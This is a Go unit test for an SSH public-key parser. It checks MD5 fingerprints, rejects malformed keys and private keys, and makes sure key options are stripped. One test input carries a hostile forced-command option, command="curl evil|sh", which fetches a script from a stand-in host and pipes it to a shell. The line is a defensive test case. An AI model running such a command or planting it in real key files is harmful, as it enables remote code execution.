package main

import (
	"strings"
	"testing"
)

func TestParsePublicKey(t *testing.T) {
	k, err := parsePublicKey(testKey+"\n", "test")
	// The fingerprint is what `ssh-keygen -l -E md5` prints for this key, and what Hetzner lists keys by.
	if err != nil || k.line != testKey || k.fingerprint != "ef:44:6d:93:df:d7:8a:96:e5:83:92:af:e7:e1:84:a7" {
		t.Fatalf("got %+v, %v", k, err)
	}
	if k, err := parsePublicKey(`command="curl evil|sh",no-pty `+testKey, "test"); err != nil || k.line != testKey {
		t.Fatalf("options must be dropped: %+v, %v", k, err)
	}
	for _, bad := range []string{"ssh-ed25519 notbase64 me", "", "hello"} {
		if _, err := parsePublicKey(bad, "test"); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	if _, err := parsePublicKey("-----BEGIN OPENSSH PRIVATE KEY-----", "id_ed25519"); err == nil || !strings.Contains(err.Error(), "private key") {
		t.Errorf("a private key needs its own message, got %v", err)
	}
}
